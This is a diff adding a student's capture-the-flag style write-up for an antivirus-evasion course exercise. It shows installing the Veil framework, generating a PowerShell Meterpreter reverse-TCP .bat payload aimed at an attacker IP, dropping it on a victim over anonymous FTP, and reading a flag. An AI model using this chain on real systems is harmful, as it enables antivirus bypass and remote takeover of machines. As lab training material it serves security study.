@@ -1,3 +1,42 @@
 Questions 3
 Capstone Exercise: Similar to the previous exercise, you'll be facing off against COMODO antivirus engine v12.2.2.8012 on Module Exercise VM #2. Although the PowerShell AV bypass we covered in this Module is substantial, it has an inherent limitation. The malicious script cannot be double-clicked by the user for an immediate execution. Instead, it would open in notepad.exe or another default text editor. The tradecraft of manually weaponizing PowerShell scripts is beyond the scope of this module, but we can rely on another open-source framework to help us automate this process. Research how to install and use the Veil framework to help you with this exercise.
 The victim machine runs an anonymous FTP server with open read/write permissions. Every few seconds, the victim user will double-click on any existing Windows batch script file(s) (.bat) in the FTP root directory. If the antivirus flags the script as malicious, the script will be quarantined and then deleted. Otherwise, the script will execute and hopefully, grant you a reverse shell
+
+Follow to the question we need to install Veil and use it to create payload
+
+https://github.com/Veil-Framework/Veil
+apt -y install veil
+/usr/share/veil/config/setup.sh
+
+Are you sure you wish to install Veil?
+     Continue with installation? ([y]es/[s]ilent/[N]o): y
+[ALERT]: Existing Veil Wine environment detected at: /var/lib/veil/wine
+     Do you want to nuke it? ([y]es/[N]o): y
+
+# Troubleshoot
+https://github.com/Veil-Framework/Veil/issues/427
+https://github.com/Veil-Framework/Veil/issues/219
+sudo cp -r /opt/metasploit-framework/embedded/framework /usr/share
+sudo mv /usr/share/framework /usr/share/metasploit-framework
+apt -y install veil
+/usr/share/veil/config/setup.sh --force --silent
+
+veil -t Evasion -p powershell/meterpreter/rev_tcp.py --ip 192.168.45.213 --port 6666
+ [*] Language: powershell
+ [*] Payload Module: powershell/meterpreter/rev_tcp
+ [*] PowerShell doesn't compile, so you just get text :)
+ [*] Source code written to: /var/lib/veil/output/source/payload.bat
+ [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/payload.rc
+
+mv /var/lib/veil/output/source/payload.bat /home/kali/Desktop/cute.batch
+chmod 777 cute.bat
+
+ftp anonymous@192.168.241.53
+ftp> binary
+ftp> passive
+ftp> put cute.bat
+
+C:\Users\Administrator\Desktop>type flag.txt
+type flag.txt
+OS{d2841905101d0a2e133fe4e10cafdad1}
+
